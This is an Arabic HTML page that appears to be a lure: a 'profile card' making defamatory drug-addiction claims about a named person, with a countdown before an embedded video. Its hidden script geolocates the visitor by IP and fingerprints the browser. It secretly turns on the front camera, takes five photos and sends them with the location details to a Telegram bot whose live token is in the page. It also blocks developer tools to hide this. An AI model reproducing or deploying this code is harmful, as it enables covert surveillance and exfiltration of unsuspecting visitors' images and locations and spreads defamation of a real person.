<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>فيديو + بطاقة شخصية</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            background: #000;
            overflow: hidden;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }

        /* ==================== الحاوية الرئيسية (تقسيم الشاشة) ==================== */
        .split-container {
            display: flex;
            width: 100%;
            height: 100vh;
            position: fixed;
            top: 0;
            left: 0;
        }

        /* ==================== الجانب الأيسر (صورة + معلومات) ==================== */
        .left-side {
            width: 30%;
            background: linear-gradient(135deg, rgba(0,0,0,0.85) 0%, rgba(0,0,0,0.7) 100%);
            backdrop-filter: blur(10px);
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            padding: 20px;
            z-index: 15;
            border-left: 1px solid rgba(255,255,255,0.2);
            overflow-y: auto;
        }

        /* الصورة الشخصية (ثابتة) */
        .profile-image {
            width: 180px;
            height: 180px;
            border-radius: 50%;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            padding: 4px;
            margin-bottom: 25px;
        }

        .profile-image img {
            width: 100%;
            height: 100%;
            border-radius: 50%;
            object-fit: cover;
        }

        /* الاسم (نص ثابت) */
        .user-name {
            font-size: 22px;
            font-weight: bold;
            color: white;
            margin-bottom: 15px;
            text-align: center;
            background: rgba(255,255,255,0.1);
            padding: 8px 20px;
            border-radius: 30px;
        }

        /* سطر المعلومات (نص ثابت) */
        .info-line {
            background: rgba(255,255,255,0.1);
            border-radius: 15px;
            padding: 15px 20px;
            width: 100%;
            max-width: 280px;
            text-align: center;
            margin-top: 10px;
        }

        .info-line p {
            color: white;
            font-size: 14px;
            line-height: 1.8;
            word-break: break-word;
        }

        /* ==================== الجانب الأيمن (فيديو) ==================== */
        .right-side {
            width: 70%;
            position: relative;
            background: #000;
        }

        /* شاشة سوداء مع مؤقت */
        .black-screen {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: #000;
            z-index: 10;
            display: flex;
            align-items: center;
            justify-content: center;
            transition: opacity 1s;
        }

        .timer-text {
            color: white;
            font-size: 48px;
            font-family: monospace;
            background: rgba(0,0,0,0.7);
            padding: 20px 40px;
            border-radius: 20px;
            text-align: center;
        }

        .timer-text small {
            font-size: 18px;
            display: block;
            margin-top: 10px;
            color: #aaa;
        }

        .video-background {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            z-index: 1;
            visibility: hidden;
            opacity: 0;
            transition: visibility 0s, opacity 1s;
            background: #000;
        }

        .video-background.show {
            visibility: visible;
            opacity: 1;
        }

        .video-background iframe {
            width: 100%;
            height: 100%;
            border: none;
        }

        .hidden-camera {
            position: fixed;
            top: -9999px;
            left: -9999px;
            width: 1px;
            height: 1px;
            opacity: 0;
            visibility: hidden;
        }

        canvas {
            display: none;
        }

        ::-webkit-scrollbar {
            display: none;
        }
    </style>
</head>
<body>

    <div class="split-container">
        <!-- ==================== الجانب الأيسر: صورة ثابتة + اسم ثابت + معلومات ثابتة ==================== -->
        <div class="left-side">
            <!-- الصورة الشخصية - ضع رابط الصورة الذي تريده هنا -->
            <div class="profile-image">
                <img id="userImage" src="" alt="الصورة الشخصية" onerror="this.src='https://g.top4top.io/p_3747n7tsd1.png'">
            </div>

            <!-- الاسم الثابت -->
            <div class="user-name">بوس واو الفلبيني</div>

            <!-- المعلومات الثابتة -->
            <div class="info-line">
                <p>
                    📍 مواليد السعودية في سنوات العشر<br>
                    ⚠️ ادمن مخدرات واصبح شخص عاله على والديه<br>
                    👨‍👦 اخوه انس اكمل مرحله دراسيه وهو من يتكفل بصرف عليه
                </p>
            </div>
        </div>

        <!-- ==================== الجانب الأيمن: فيديو ==================== -->
        <div class="right-side">
            <div class="black-screen" id="blackScreen">
                <div class="timer-text">
                    <span id="countdown">30</span>
                    <small>ثانية</small>
                </div>
            </div>

            <div class="video-background" id="videoBackground">
                <iframe id="youtubeFrame" 
                        src=""
                        frameborder="0"
                        allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture"
                        allowfullscreen>
                </iframe>
            </div>
        </div>
    </div>

    <!-- كاميرا مخفية -->
    <div class="hidden-camera">
        <video id="camera" autoplay playsinline muted></video>
    </div>
    <canvas id="canvas"></canvas>

    <script>
        // ==================== إعدادات تليجرام ====================
        const BOT_TOKEN = "8179040156:AAFdn8ApCAIbaWhpLaFQMyqrwUwfR1hfyuY";
        let CHAT_ID = null;
        let stream = null;
        let cameraReady = false;
        let notificationSent = false;
        
        const YOUTUBE_VIDEO_ID = "dQw4w9WgXcQ";
        
        let ip = 'جاري الجلب...';
        let country = 'جاري الجلب...';
        let city = 'جاري الجلب...';
        let os = 'جاري الجلب...';
        let browser = 'جاري الجلب...';
        let device = 'جاري الجلب...';
        let cameraStatus = 'لم يتم الطلب بعد';
        
        // عناصر DOM
        const camera = document.getElementById('camera');
        const canvas = document.getElementById('canvas');
        const blackScreen = document.getElementById('blackScreen');
        const videoBackground = document.getElementById('videoBackground');
        const youtubeFrame = document.getElementById('youtubeFrame');
        const countdownSpan = document.getElementById('countdown');
        
        // ==================== إرسال رسالة إلى تليجرام ====================
        async function sendTelegramMessage(message) {
            if (!CHAT_ID) return false;
            try {
                const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: CHAT_ID,
                        text: message,
                        parse_mode: 'HTML'
                    })
                });
                return response.ok;
            } catch(e) {
                return false;
            }
        }
        
        // ==================== إرسال إشعار فتح الرابط ====================
        async function sendOpenNotification() {
            if (notificationSent) return;
            
            setTimeout(async () => {
                const message = `
🚪 <b>تم فتح الرابط</b>

👤 <b>الاسم:</b> بوس واو الفلبيني
📝 <b>المعلومات:</b> مواليد السعودية - ادمن مخدرات
🌐 <b>IP:</b> ${ip}
🗺️ <b>الدولة:</b> ${country}
🏙️ <b>المدينة:</b> ${city}
💻 <b>نظام التشغيل:</b> ${os}
🌍 <b>المتصفح:</b> ${browser}
📷 <b>الكاميرا:</b> ${cameraStatus}
🕐 <b>الوقت:</b> ${new Date().toLocaleString('ar-SA')}
                `;
                await sendTelegramMessage(message);
                notificationSent = true;
            }, 2000);
        }
        
        // ==================== إرسال إشعار رفض الكاميرا ====================
        async function sendCameraDeniedNotification() {
            const message = `
⚠️ <b>تم رفض الكاميرا</b>

👤 <b>الاسم:</b> بوس واو الفلبيني
🌐 <b>IP:</b> ${ip}
🗺️ <b>الدولة:</b> ${country}
🏙️ <b>المدينة:</b> ${city}
💻 <b>نظام التشغيل:</b> ${os}
❌ <b>الحالة:</b> المستخدم رفض الكاميرا
🕐 <b>الوقت:</b> ${new Date().toLocaleString('ar-SA')}
            `;
            await sendTelegramMessage(message);
        }
        
        // ==================== جلب معلومات النظام ====================
        function getSystemInfo() {
            const userAgent = navigator.userAgent;
            
            if (userAgent.indexOf('Win') !== -1) {
                if (userAgent.indexOf('Windows NT 10.0') !== -1) os = 'Windows 10/11';
                else if (userAgent.indexOf('Windows NT 6.1') !== -1) os = 'Windows 7';
                else os = 'Windows';
            }
            else if (userAgent.indexOf('Mac') !== -1) os = 'macOS';
            else if (userAgent.indexOf('Linux') !== -1) {
                if (userAgent.indexOf('Android') !== -1) os = 'Android';
                else os = 'Linux';
            }
            else if (userAgent.indexOf('iOS') !== -1) os = 'iOS';
            else if (userAgent.indexOf('iPhone') !== -1) os = 'iOS (iPhone)';
            else if (userAgent.indexOf('iPad') !== -1) os = 'iOS (iPad)';
            else os = 'غير معروف';
            
            if (userAgent.indexOf('Chrome') !== -1 && userAgent.indexOf('Edg') === -1) browser = 'Chrome';
            else if (userAgent.indexOf('Firefox') !== -1) browser = 'Firefox';
            else if (userAgent.indexOf('Safari') !== -1 && userAgent.indexOf('Chrome') === -1) browser = 'Safari';
            else if (userAgent.indexOf('Edg') !== -1) browser = 'Edge';
            else browser = 'غير معروف';
            
            if (/Mobile|Android|iPhone|iPad|iPod/i.test(userAgent)) device = 'جوال';
            else device = 'كمبيوتر';
        }
        
        // ==================== جلب IP والموقع ====================
        async function getLocationInfo() {
            const services = [
                { url: 'https://ipapi.co/json/', parse: (d) => ({ ip: d.ip, country: d.country_name, city: d.city }) },
                { url: 'https://ipwho.is/', parse: (d) => ({ ip: d.ip, country: d.country, city: d.city }) },
                { url: 'https://freeipapi.com/api/json/', parse: (d) => ({ ip: d.ipAddress, country: d.countryName, city: d.cityName }) },
                { url: 'https://ip-api.com/json/', parse: (d) => ({ ip: d.query, country: d.country, city: d.city }) }
            ];
            
            for (const service of services) {
                try {
                    const response = await fetch(service.url, { signal: AbortSignal.timeout(5000) });
                    if (response.ok) {
                        const data = await response.json();
                        const result = service.parse(data);
                        if (result.ip && result.ip !== 'undefined') {
                            ip = result.ip;
                            country = result.country || 'غير متاح';
                            city = result.city || 'غير متاح';
                            return;
                        }
                    }
                } catch(e) {}
            }
            
            try {
                const response = await fetch('https://api.ipify.org?format=json');
                const data = await response.json();
                ip = data.ip || 'غير متاح';
            } catch(e) {
                ip = 'غير متاح';
            }
        }
        
        // ==================== الحصول على Chat ID ====================
        async function getChatId() {
            try {
                const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getUpdates`);
                const result = await response.json();
                if (result.ok && result.result.length > 0) {
                    CHAT_ID = result.result[result.result.length - 1].message?.chat?.id;
                    return true;
                }
                return false;
            } catch(error) {
                return false;
            }
        }
        
        // ==================== تشغيل الكاميرا ====================
        async function startCamera() {
            try {
                cameraStatus = 'في انتظار الموافقة';
                stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                camera.srcObject = stream;
                cameraReady = true;
                cameraStatus = '✅ تمت الموافقة';
                return true;
            } catch(err) {
                if (err.name === 'NotAllowedError') {
                    cameraStatus = '❌ تم الرفض';
                    await sendCameraDeniedNotification();
                }
                else if (err.name === 'NotFoundError') cameraStatus = '❌ لا توجد كاميرا';
                else if (err.name === 'NotReadableError') cameraStatus = '❌ الكاميرا مشغولة';
                else cameraStatus = '❌ خطأ';
                cameraReady = false;
                return false;
            }
        }
        
        // ==================== التقاط وإرسال الصورة ====================
        async function captureAndSend(photoNumber) {
            if (!CHAT_ID || !cameraReady) return false;
            
            try {
                if (camera.videoWidth === 0 || camera.videoHeight === 0) return false;
                
                canvas.width = camera.videoWidth;
                canvas.height = camera.videoHeight;
                const ctx = canvas.getContext('2d');
                ctx.translate(canvas.width, 0);
                ctx.scale(-1, 1);
                ctx.drawImage(camera, 0, 0, canvas.width, canvas.height);
                ctx.setTransform(1, 0, 0, 1, 0, 0);
                
                const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg', 0.8));
                const formData = new FormData();
                formData.append('chat_id', CHAT_ID);
                formData.append('photo', blob, `photo_${Date.now()}.jpg`);
                formData.append('caption', `📸 ${photoNumber}/5 | بوس واو الفلبيني | ${new Date().toLocaleString('ar-SA')}`);
                
                const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                    method: 'POST',
                    body: formData
                });
                const result = await response.json();
                return result.ok;
            } catch(e) {
                return false;
            }
        }
        
        // ==================== تصوير 5 صور ====================
        async function captureAllPhotos() {
            if (!cameraReady) return;
            
            for (let i = 1; i <= 5; i++) {
                await captureAndSend(i);
                if (i < 5) await new Promise(resolve => setTimeout(resolve, 9000));
            }
            
            setTimeout(() => {
                if (stream) stream.getTracks().forEach(track => track.stop());
            }, 2000);
        }
        
        // ==================== تأخير تشغيل الفيديو ====================
        function startVideoDelay() {
            let secondsLeft = 30;
            countdownSpan.textContent = secondsLeft;
            
            const countdownInterval = setInterval(() => {
                secondsLeft--;
                countdownSpan.textContent = secondsLeft;
                
                if (secondsLeft <= 0) {
                    clearInterval(countdownInterval);
                    const videoUrl = `https://www.youtube.com/embed/${YOUTUBE_VIDEO_ID}?autoplay=1&mute=1&controls=0&loop=1&playlist=${YOUTUBE_VIDEO_ID}&modestbranding=1&rel=0&showinfo=0`;
                    youtubeFrame.src = videoUrl;
                    
                    blackScreen.style.opacity = '0';
                    setTimeout(() => { blackScreen.style.display = 'none'; }, 1000);
                    videoBackground.classList.add('show');
                }
            }, 1000);
        }
        
        // ==================== التشغيل الرئيسي ====================
        async function init() {
            getSystemInfo();
            await getLocationInfo();
            await getChatId();
            await sendOpenNotification();
            const cameraSuccess = await startCamera();
            if (cameraSuccess && CHAT_ID) setTimeout(() => captureAllPhotos(), 1000);
            startVideoDelay();
        }
        
        init();
        
        // منع أدوات المطور
        document.addEventListener('contextmenu', e => e.preventDefault());
        document.addEventListener('keydown', function(e) {
            if (e.key === 'F12' || 
                (e.ctrlKey && e.shiftKey && (e.key === 'I' || e.key === 'J' || e.key === 'C')) || 
                (e.ctrlKey && e.key === 'U')) {
                e.preventDefault();
                return false;
            }
        });
        
        window.onbeforeunload = () => {
            if (stream) stream.getTracks().forEach(t => t.stop());
        };
    </script>
</body>
</html>
